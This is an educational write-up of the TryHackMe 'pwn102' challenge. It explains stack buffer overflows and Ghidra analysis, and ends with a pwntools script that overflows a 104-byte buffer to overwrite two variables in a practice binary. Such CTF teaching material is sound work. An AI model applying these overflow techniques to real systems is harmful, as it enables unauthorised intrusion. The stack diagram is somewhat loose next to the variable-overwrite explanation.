---
title: "pwn102"
date: 2024-01-10
layout: "simple"
categories: [Binary exploitation]
tags: [Tryhackme]
image: https://i.ibb.co/cgYN2Kr/th-3134630742.jpg
---


## 102

### Intoroduction

So for the next challenge we are required to modify a variable's value. This occurs when data larger than the allocated memory space (buffer) is written into that buffer. As a result, it can overwrite adjacent memory, including variables. But then if the stack grows downwards and the return address is above the variables space it should write the the memory below and not above, right? No, what happens is functions called later get stack frames at lower memory, and the return address is pushed to the higher address than the local variables. But arrays and buffers are indexed upwards in memory, so writing past the end of the array will nicely land on the return address next on the stack.

The stack would look like this:

```
 <---- stack grows to the left
    memory addresses increase to the right -->
  0x8000                        0x8010
  +--------+----------+---------++------------
  + buf[8] | ret addr | char *s ||   ....... 
  +--------+----------+---------++--------------

```
Let's analyze the binary in ghidra for a better look.

### Analysis

![4](https://i.ibb.co/N2bFgf6/ghidra.png)

Here we can see that we have a buffer set to 104, meaning we can input data larger than 104 and be able to modify the variables that come in after. We can now see that we have two variables that have been defined. We can also see an if function that checks if the two variables are equal to some values, if not the program exits. Since we now know what the two values should be equal to, let us modify them.

### Exploit

After the disassembly we can now come up with our very own exploit. This time we are going to be using pwntools to craft an exploit. Looking at our disassembled code in ghidra we can see that the values for parameter 1 and parameter 2 should be ```0xc0ff33 and 0xc0d3``` respectively. Due to little endianness we first pass in the second parameter and then the first parameter. Little Endianness refers to the byte order used to store data in computer memory. In a system that uses Little Endianness, the least significant byte (the "little end") of a multi-byte value is stored at the lowest memory address, while the most significant byte (the "big end") is stored at a higher memory address. To check for endianness you can use ```rabin2 -I binary```.

Awesome now with the information gathered lets craft an exploit.

```
from pwn import *

p = process("./pwn102.pwn102") # runs the binary locally
#p = remote("ip_provided", 9002) # runs remotely

param_1 = p32(0xc0ff33) # packed in 32 bit since it is short
param_2 = p32(0xc0d3)

payload = b'A' * 104 # filling the buffer with bunch of A's
payload += param_2 
payload += param_1

p.sendlineafter("?", payload) # sending the payload
p.interactive() # spawn a shell
```